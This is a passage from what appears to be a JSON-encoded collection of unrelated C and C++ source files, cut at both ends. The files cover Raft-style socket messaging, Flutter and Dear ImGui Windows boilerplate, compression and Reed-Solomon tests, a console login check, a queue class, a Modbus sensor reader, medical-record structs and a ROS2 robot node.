\"Leader\";\n        if (message.find(\"heartbeat\") == std::string::npos) {                        \n            std::cout << \"Node \" << id << \" (State: \" << state_str << \", Term: \" << term << \") sending message to node \" << node_id << \" : \" << message<< std::endl;\n        }\n        \n        std::string ip = \"127.0.0.1\";\n        int port = base_port + node_id;\n        int sock = socket(AF_INET, SOCK_STREAM, 0);\n        if (sock < 0) {\n            std::cerr << id << \": Socket creation failed.\" << std::endl;\n            return;\n        }\n\n        struct timeval timeout;\n        timeout.tv_sec = timeout_ms / 1000;\n        timeout.tv_usec = (timeout_ms % 1000) * 1000;\n        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));\n\n        struct sockaddr_in serv_addr;\n        memset(&serv_addr, 0, sizeof(serv_addr));\n        serv_addr.sin_family = AF_INET;\n        serv_addr.sin_port = htons(port);\n        if (inet_pton(AF_INET, ip.c_str(), &serv_addr.sin_addr) <= 0) {\n            std::cerr << id << \": Invalid address / Address not supported\" << std::endl;\n            close(sock);\n            return;\n        }\n\n        int retry_count = 0;\n        bool sent_successfully = false;\n\n        while (retry_count < max_retries && !sent_successfully) {\n            if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n                std::cerr << id << \": Connection to node \" << node_id << \" failed.\" << std::endl;\n                retry_count++;\n                std::cerr << \"Retry \" << retry_count << \" of \" << max_retries << std::endl;\n                continue;\n            }\n\n            if (send(sock, message.c_str(), message.length(), 0) < 0) {\n                std::cerr << id << \": Failed ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Dear ImGui: standalone example application for Win32 + OpenGL 3\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// This is provided for completeness, however it is strongly recommended you use OpenGL with SDL or GLFW.\n\n#include \"imgui.h\"\n#include \"imgui_impl_opengl3.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <GL/GL.h>\n#include <tchar.h>\n\n// Data stored per platform window\nstruct WGL_WindowData { HDC hDC; };\n\n// Data\nstatic HGLRC            g_hRC;\nstatic WGL_WindowData   g_MainWindow;\nstatic int              g_Width;\nstatic int              g_Height;\n\n// Forward declarations of helper functions\nbool CreateDeviceWGL(HWND hWnd, WGL_WindowData* data);\nvoid CleanupDeviceWGL(HWND hWnd, WGL_WindowData* data);\nvoid ResetDeviceWGL();\nLRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\n\n// Main code\nint main(int, char**)\n{\n    // Create application window\n    //ImGui_ImplWin32_EnableDpiAwareness();\n    WNDCLASSEXW wc = { sizeof(wc), CS_OWNDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L\"ImGui Example\", nullptr };\n    ::RegisterClassExW(&wc);\n    HWND hwnd = ::CreateWindowW(wc.lpszClassName, L\"Dear ImGui Win32+OpenGL3 Example\", WS_OVERLAPPEDWINDOW, 100, 100, 1280, 800, nullptr, nullptr, wc.hInstance, nullptr);\n\n    // Initialize OpenGL\n    if (!CreateDeviceWGL(hwnd, &g_MainWindow))\n    {\n        CleanupDeviceWGL(hwnd, &g_MainWindow);\n        ::DestroyWindow(hwnd);\n        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);\n        return 1;\n    }\n    wglMakeCurrent(g_MainWindow.hDC, g_hRC);\n\n    // Show the window\n    ::ShowWindow(hwnd, SW_SHOWDEFAULT);\n    ::UpdateWindow(hwnd);\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;   // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;    // Enable Gamepad Controls\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsClassic();\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplWin32_InitForOpenGL(hwnd);\n    ImGui_ImplOpenGL3_Init();\n\n    // Load Fonts\n    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.\n    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.\n    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).\n    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.\n    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.\n    // - Read 'docs/FONTS.md' for more instructions and details.\n    // - Remember that in C/C++ if you want to include a backslash \\ in a string literal you need to write a double backslash \\\\ !\n    //io.Fonts->AddFontDefault();\n    //io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\segoeui.ttf\", 18.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/DroidSans.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Roboto-Medium.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Cousine-Regular.ttf\", 15.0f);\n    //ImFont* font = io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\ArialUni.ttf\", 18.0f, nullptr, io.Fonts->GetGlyphRangesJapanese());\n    //IM_ASSERT(font != nullptr);\n\n    // Our state\n    bool show_demo_window = true;\n    bool show_another_window = false;\n    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);\n\n    // Main loop\n    bool done = false;\n    while (!done)\n    {\n        // Poll and handle messages (inputs, window resize, etc.)\n        // See the WndProc() function below for our to dispatch events to the Win32 backend.\n        MSG msg;\n        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))\n        {\n            ::TranslateMessage(&msg);\n            ::DispatchMessage(&msg);\n            if (msg.message == WM_QUIT)\n                done = true;\n        }\n        if (done)\n            break;\n\n        // Start the Dear ImGui frame\n        ImGui_ImplOpenGL3_NewFrame();\n        ImGui_ImplWin32_NewFrame();\n        ImGui::NewFrame();\n\n        // 1. Show the big demo window (Most of the sample code is in ImGui::ShowDemoWindow()! You can browse its code to learn more about Dear ImGui!).\n        if (show_demo_window)\n          ",
    "#include \"pch.h\"\n\n#include \"huffman/huffman.h\"\n#include \"bws/bws.h\"\n#include \"reed_solomon/reed_solomon.h\"\n\n#include \"utils/modular_t.h\"\n#include \"utils/polynomial_t.h\"\n#include \"utils/matrix_t.h\"\n\nstd::string load_text(const std::string& filepath)\n{\n\tFILE* fp;\n\t\n\tif (fopen_s(&fp, filepath.c_str(), \"rb\"))\n\t{\n\t\tstd::cerr << \"error when opening file \\\"\" << filepath << \"\\\"\\n\";\n\t\texit(1);\n\t}\n\n\tfseek(fp, 0, SEEK_END);\n\tsize_t length = ftell(fp);\n\trewind(fp);\n\tchar* str = new char[length + 1];\n\tfread(str, sizeof(char), length, fp);\n\tfclose(fp);\n\tstr[length] = '\\0';\n\tstd::string content = str;\n\tdelete[] str;\n\treturn content;\n}\n\nvoid huffman_test()\n{\n\tstd::cout << \"huffman\\n\";\n\tstd::string text = load_text(\"res/huffman_test.txt\");\n\n\tauto compressed = huffman::compress(text);\n\n\tstd::string decompressed_text = huffman::decompress(compressed);\n\t\n\tassert(decompressed_text == text);\n\t\n\tstd::cout << text.size() << \" bytes -> \" << compressed.size() << \" bytes\\n\";\n\n\tstd::cout << \"huffman tests passed!\\n\";\n}\n\nvoid bws_test() \n{\n\tstd::cout << \"bws\\n\";\n\tstd::string text = \"BANANA\";\n\t\n\tstd::wstring T = bws::transform(text);\n\t\n\tstd::string res = bws::inverse_transform(T);\n\t\n\tassert(res == text);\n\n\tstd::cout << \"bws tests passed!\\n\";\n}\n\nvoid test() \n{\n\thuffman_test();\n\tbws_test();\n}\n\nint main()\n{\n\tstd::string message = \"hello world\";\n\n\tstd::string something = reed_solomon::encode(message);\n\n\tstd::string decoded = reed_solomon::decode(something);\n\n\n\tstd::cout << decoded << '\\n';\n\n\n\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"my_flutter_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include <cstring>\r\nusing namespace std;\r\n\r\nint main(){\r\n\t\r\n\tchar email[50], emaillogin[50];\r\n\tchar senha[50], senhalogin[50];\r\n\tchar senha1[50];\r\n\tint aux = 0;\r\n\tint result, resultlogin, resultpass;\r\n\t\r\n\twhile(1)\r\n\t{\r\n\t\t\r\n\t\twhile(aux == 0)\r\n\t\t{\r\n\t\t\t\r\n\t\t\tcin.getline(email,50);\r\n\t\t\tcin.getline(senha,50);\r\n\t\t\tcin.getline(senha1,50);\r\n\t\t\t\r\n\t\t\tstrcmp(senha,senha1);\r\n\t\t\tresult = strcmp(senha,senha1);\r\n\t\t\r\n\t\t\tif (result != 0)\r\n\t\t\t{\r\n\t\t\t\tcout << \"As senhas nao correspondem.\" << endl;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse if (result == 0)\r\n\t\t\t{\r\n\t\t\t\taux += 1;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}\t\r\n\t\t\r\n\t\tcout << \"login\" << endl;\r\n\t\tcin.getline(emaillogin,50);\r\n\t\tstrcmp(email, emaillogin);\r\n\t\tresultlogin = strcmp(email, emaillogin);\r\n\t\t\r\n\t\tif (resultlogin == 0)\r\n\t\t{\r\n\t\t\tcout << \"senha\" << endl;\t\r\n\t\t}\r\n\t\t\r\n\t\tcin.getline(senhalogin,50);\r\n\t\tstrcmp(senha, senhalogin);\r\n\t\tresultpass = strcmp(senha, senhalogin);\r\n\t\t\r\n\t\tif (resultpass == 0)\r\n\t\t{\r\n\t\t\tcout << \"login validado\" << endl;\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\t\t\r\n\t\t\r\n\t\t\t\r\n\t}\r\n\t\r\n\treturn 0;\r\n}",
    "#include <iostream>\nusing namespace std;\ntemplate<class t>\nclass array_queue{\n    int index;\n    int size;\n    int qsize;\n    t* front;\n    t* rare;\n    t* arr;\npublic:\n    array_queue():size(100), index(0), qsize(0)\n    {\n        arr = new t[size];\n        front = nullptr;\n        rare = nullptr;\n    }\n    array_queue(int s) : size(s), index(0), qsize(0) {\n        arr = new t[size];\n        front = nullptr;\n        rare = nullptr;\n    }\n    ~array_queue() {\n        delete[] arr;\n    }\n\n    void enqueue(t ele) {\n        if (qsize < size) {\n            arr[index] = ele;\n            if (qsize == 0)\n                front = &arr[index];\n            rare = &arr[index];\n            index++;\n            qsize++;\n\n        } else {\n            cout << \"Error: The Queue is Full.\\n\" <<endl;\n        }\n    }\n    t dequeue()\n    {\n        if(isempty())\n        {\n            cout<<\"Error: The Queue is Empty.\\n\";\n            return t();\n        }\n        else if(front==rare)\n        {  t *i=front;\n            clear();\n            return *i;\n        }\n        else{\n            qsize--;\n            t *i=front;\n            front++;\n            return *i;\n        }\n    }\n    t first()\n    {\n        if(isempty())\n        {\n            cout<<\"Error: The Queue is Empty.\\n\";\n            return t();\n        }\n        else{\n            t *i=front;\n            return *i;\n        }\n    }\n    bool isempty()\n    {   if(qsize==0)\n        {return true;\n        rare=0;\n        }\n        else\n            return false;\n\n    }\n    void clear()\n    {\n        qsize=0;\n        index=0;\n        front=nullptr;\n        rare=nullptr;\n        delete[] arr;\n        arr = new t[size];\n\n    }\n    int queuesize(){\n        return qsize;\n    }\n    void print()\n    {\n        if(isempty())\n            cout<<\"Error: The Queue is Empty.\\n\";\n        else{\n            t *i=front;\n            while (i!=rare+1) {\n                cout<<*i<<\" \";\n                i++;\n            }cout<<\"\\n\";\n        }\n    }\n\n};\n\n\nvoid functions_of_array_queue()\n{\n\n    array_queue<int> q(5);\n    q.enqueue(10);\n    q.enqueue(20);\n    q.enqueue(30);\n    q.enqueue(40);\n    q.enqueue(50);\n    cout<<\"the current values in the array based queue: \\n\";\n    q.print();\n    auto  deleted=q.dequeue();\n    cout<<\"\\nthe first element -->\"<<deleted<<\"<-- in the queue is deleted\\n\";\n    q.enqueue(40);\n    q.enqueue(50);\n    cout<<\"\\nthe current values in the queue array based: \\n\";\n    q.print();\n    auto first_ele=q.first();\n    cout<<\"\\n-->\"<<first_ele<<\"<-- is the first element in queue\\n\";\n    cout<<\"\\nis the queue empty? \"<<q.isempty()<<\"\\n\";\n    cout<<\"\\nthe queue size: \"<<q.queuesize()<<\"\\n\";\n    q.clear();\n    cout<<\"\\nthe current values in the queue : \\n\";\n    q.print();\n    cout<<\"\\nis the queue empty? \"<<q.isempty()<<\"\\n\";\n\n}\nint main() {\n\n    functions_of_array_queue();\n\n}\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <ModbusRTU.h>\n#include <SoftwareSerial.h>\n\n#define TX_G16 16\n#define RX_G17 17\n#define RE_DE_ENABLE 15\n\nfloat InttoFloat(uint16_t Data0, uint16_t Data1){\n  float x;\n  unsigned long *p;\n\n  p = (unsigned long*)&x;\n  *p = (unsigned long)Data0 << 16 | Data1; //Bid-endian\n  return (x);\n}\nSoftwareSerial S(RX_G17, TX_G16); // RX, TX\nModbusRTU mb;\n\nbool cb(Modbus::ResultCode event, uint16_t transactionId, void* data){\n  if(event != Modbus::EX_SUCCESS){\n    Serial.print(\"Request result : 0x\");\n    Serial.print(event, HEX);\n  }\n  return true;\n}\n\n\nvoid setup() {\n  Serial.begin(9600);\n  S.begin(19200, SWSERIAL_8E1);\n  mb.begin(&S,RE_DE_ENABLE);\n  mb.master();\n\n}\n\nuint16_t val[2];\n\nvoid loop() {\n  \n  if (!mb.slave()) {\n    \n    mb.readHreg(2, 3926, val, 2, cb); // Slave id is 1 and register address is 3926 and \n    //we are reading 2 bytes from the register and saving in val\n    while(mb.slave()) { // Check if transaction is active\n      mb.task();\n      delay(100);\n    }\n    Serial.print(\"Register Values \");\n    Serial.print(val[0]);\n    Serial.print(\",\");\n    Serial.println(val[1]);\n    float voltage= InttoFloat(val[1],val[0]);\n    Serial.print(\"Voltage= \");\n    Serial.print(voltage);\n    Serial.println(\" V\");\n\n      }\n  delay(1000);\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nstruct Cidade\r\n{\r\n    int codigo;\r\n    char nome[35];\r\n    char UF[2];\r\n};\r\n\r\nstruct Especialidade\r\n{\r\n    int codigo;\r\n    char descricao[50];\r\n};\r\n\r\nstruct Medico\r\n{\r\n    int codigo;\r\n    char nome[35];\r\n    int codigo_especialidade;\r\n    char endereco[35];\r\n    char telefone[13];\r\n    int codigo_cidade;\r\n};\r\n\r\nstruct Paciente\r\n{\r\n    int codigo;\r\n\r\n    char CPF[11];\r\n    char nome[35];\r\n    char endereco[35];\r\n    int codigo_cidade;\r\n};\r\n\r\nstruct CID\r\n{\r\n    int codigo;\r\n    char descricao[50];\r\n};\r\n\r\nstruct Medicamento\r\n{\r\n    int codigo;\r\n    char descricao[50];\r\n    int quant_estoque;\r\n    int estoque_minimo;\r\n    int estoque_maximo;\r\n    float preco_unitario;\r\n};\r\n\r\nstruct Data\r\n{\r\n    int dia;\r\n    int mes;\r\n    int ano;\r\n};\r\nstruct Consulta\r\n{\r\n    char cpf_paciente[11];\r\n    int cod_medico;\r\n    char horario[5];\r\n    Data data;\r\n    int cod_CID;\r\n    int cod_medicamento;\r\n    int qtde_medicamento;\r\n};\r\n\r\nvoid lerDadosCidades(Cidade cidade[], int quantidade)\r\n{\r\n    for (int i = 0; i < quantidade; i++)\r\n    {\r\n        cout << \"Insira o c\u00f3digo da cidade: \";\r\n        cin >> cidade[i].codigo;\r\n        cout << \"Insira o nome da cidade: \";\r\n        cin >> cidade[i].nome;\r\n        cout << \"Insira a Unidade Federal da cidade (Siglas): \";\r\n        cin >> cidade[i].UF;\r\n    }\r\n}\r\nvoid lerDadosEspecialidades(Especialidade especialidade[], int quantidade)\r\n{\r\n    for (int i = 0; i < quantidade; i++)\r\n    {\r\n        cout << \"Insira o c\u00f3digo da especialidade m\u00e9dica: \";\r\n        cin >> especialidade[i].codigo;\r\n        cout << \"Insira a descri\u00e7\u00e3o da especialidade: \";\r\n        cin >> especialidade[i].descricao;\r\n    }\r\n}\r\n\r\nvoid lerDadosCID(struct CID CID[], int &contador)\r\n{\r\n\r\n    int i = 0;\r\n    for (int saida = 1; i < 20 && saida != 0; i++)\r\n    {\r\n        cout << \"\\n\\nCodigo do CID \" << (i + 1) << \": \";\r\n        cin >> CID[i].codigo;\r\n        if (CID[i].codigo > 0)\r\n        {\r\n        }\r\n        else\r\n            saida = 0;\r\n    }\r\n    contador = i - 1;\r\n\r\n    // imprimirEstruturaPaciente(CID, contador);\r\n}\r\n\r\n// void imprimirEstruturaPaciente(struct Estrutura Estrutura[], int contador)\r\n// {\r\n//     cout << \"\\n\\nLista dos Registros\" << endl;\r\n//     for (int i = 0; i < contador; i++)\r\n//     {\r\n\r\n//         cout << \"valores: \" << Estrutura[i].codigo << endl;\r\n//     }\r\n//         cout << \"qnt: \" << contador << endl;\r\n// }\r\n\r\nvoid imprimirEstruturaPaciente(struct Paciente Paciente[], int contador)\r\n{\r\n    cout << \"\\n\\nLista dos Registros\" << endl;\r\n    for (int i = 0; i < contador; i++)\r\n    {\r\n\r\n        cout << \"valores: \" << Paciente[i].codigo << endl;\r\n    }\r\n    cout << \"qnt: \" << contador << endl;\r\n}\r\n\r\nvoid imprimirEstruturaMedico(struct Medico Medico[], int contador)\r\n{\r\n    cout << \"\\n\\nLista dos Registros\" << endl;\r\n    for (int i = 0; i < contador; i++)\r\n    {\r\n\r\n        cout << \"valores: \" << Medico[i].codigo << endl;\r\n    }\r\n    cout << \"qnt: \" << contador << endl;\r\n}\r\n\r\nvoid lerDadosMedicamentos(struct Medicamento Medicamento[], int &contador)\r\n{\r\n\r\n    int i = 0;\r\n    for (int saida = 1; i < 20 && saida != 0; i++)\r\n    {\r\n        cout << \"\\n\\nCodigo do Medicamento \" << (i + 1) << \": \";\r\n        cin >> Medicamento[i].codigo;\r\n        if (Medicamento[i].codigo > 0)\r\n        {\r\n        }\r\n        else\r\n            saida = 0;\r\n    }\r\n    contador = i - 1;\r\n\r\n    // imprimirMedicamento(Medicamento, contador);\r\n}\r\n\r\nvoid lerDadosPacientes(struct Paciente Paciente[], int &contador)\r\n{\r\n\r\n    int i = 0;\r\n    for (int saida = 1; i < 20 && saida != 0; i++)\r\n    {\r\n        cout << \"\\n\\nCodigo do Paciente \" << (i + 1) << \": \";\r\n        cin >> Paciente[i].codigo;\r\n        if (Paciente[i].codigo > 0)\r\n        {\r\n        }\r\n        else\r\n            saida = 0;\r\n    }\r\n    contador = i - 1;\r\n\r\n    // imprimirEstruturaPaciente(Paciente, contador);\r\n}\r\n\r\nvoid lerDadosMedicos(struct Medico Medico[], int &contador)\r\n{\r\n\r\n    int i = 0;\r\n    for (int saida = 1; i < 20 && saida != 0; i++)\r\n    {\r\n        cout << \"\\n\\nCodigo do Medico \" << (i + 1) << \": \";\r\n        cin >> Medico[i].codigo;\r\n        if (Medico[i].codigo > 0)\r\n        {\r\n        }\r\n        else\r\n            saida = 0;\r\n    }\r\n    contador = i - 1;\r\n\r\n    // imprimirEstruturaPaciente(Paciente, contador);\r\n}\r\n\r\n// ERRADO, FAZER COM BUSCA BINARIA OU SERIAL\r\nvoid verificarSeCPFRepetiu(struct Paciente S[], int contadorS, struct Paciente T[], int contadorT)\r\n{\r\n    for (int i = 0; i < contadorS; i++)\r\n    {\r\n        for (int j = 0; j < contadorT; j++)\r\n        {\r\n            if (S[i].CPF == T[j].CPF)\r\n            {\r\n                cout << \"CPF repetido: \" << S[i].CPF << endl;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nvoid verificarSeCodigoRepetiu(struct Medico S[], int contadorS, struct Medico T[], int contadorT)\r\n{\r\n    bool codigoRepetido = false;\r\n\r\n    for (int i = 0; i < contadorS; i++)\r\n    {\r\n        for (int j = 0; j < contadorT; j++)\r\n        {\r\n            if (S[i",
    "/*  \n*   A basic node for ros2 that runs with ariaCoda\n*   To run use 'ros2 run ariaNode ariaNode -rp /dev/ttyUSB0'\n*\n*   Author: Kieran Quirke-Brown\n*   Date: 12/01/2024\n*/\n\n#include <chrono>\n#include <functional>\n#include <memory>\n#include <string>\n#include <signal.h>\n\n#include <rclcpp/rclcpp.hpp>\n#include <geometry_msgs/msg/twist.hpp>\n\n# include \"Aria/Aria.h\"\n\n//used with signal handler as signal handler function doesn't accept parameters\nbool stopRunning = false;\n\nusing namespace std::chrono_literals;\n/*\n*   Basic ROS node that updates velocity of pioneer robot, Aria doesn't like\n*   being spun as a node therefore we just use a single subscriber\n*   parameters:\n*       forward and ratation speeds are float that are bound to the node\n*       but point at the same location as the aria velocities\n*/\nclass ariaNode : public rclcpp::Node {\n    public:\n        ariaNode(float* forwardSpeed, float* rotationSpeed) : Node(\"Aria_node\") {\n            currentForwardSpeed = forwardSpeed;\n            currentRotationSpeed = rotationSpeed;\n\n            cmdVelSub = create_subscription<geometry_msgs::msg::Twist> (\n                \"cmd_vel\", 10, std::bind(&ariaNode::cmdVelCallback, this, std::placeholders::_1)\n            );    \n        }\n\n    private:\n        void cmdVelCallback(const geometry_msgs::msg::Twist::SharedPtr msg) {\n            \n            double linearSpeed = msg->linear.x;\n            double angularSpeed = msg->angular.z;\n\n            *currentForwardSpeed = linearSpeed;\n            *currentRotationSpeed = angularSpeed;\n\n            RCLCPP_DEBUG(this->get_logger(), \"message received.\");\n\n        }\n\n        rclcpp::Subscription<geometry_msgs::msg::Twist>::SharedPtr cmdVelSub;\n        float* currentForwardSpeed;\n        float* currentRotationSpeed;\n    \n};\n\n// Deals with ctl+c handling to stop the motors correctly.\nvoid my_handler(int s){\n           printf(\"Caught signal %d\\n\",s);\n           stopRunning = true;\n}\n\nint main(int argc, char** argv) {\n    rclcpp::init(argc, argv);\n\n    Aria::init();\n    ArArgumentParser parser(&argc, argv);\n    parser.loadDefaultArguments();\n    ArRobot* robot;\n    robot = new ArRobot();\n\n    signal(SIGINT, my_handler);\n    \n    // RCLCPP_DEBUG(this->get_logger(),\"Trying to connect to robot...\");\n    ArRobotConnector robotConnector(&parser, robot);\n    if(!robotConnector.connectRobot()) {\n        ArLog::log(ArLog::Terse, \"simpleConnect: Could not connect to the robot.\");\n        if(parser.checkHelpAndWarnUnparsed()) {\n            Aria::logOptions();\n            Aria::exit(1);\n        }\n    }\n\n    robot->setAbsoluteMaxTransVel(400);\n\n    float forwardSpeed = 0.0;\n    float rotationSpeed = 0.0;\n    \n    \n    // RCLCPP_DEBUG(aNode->get_logger(),\"Run Async\");\n    robot->runAsync(true);\n    // 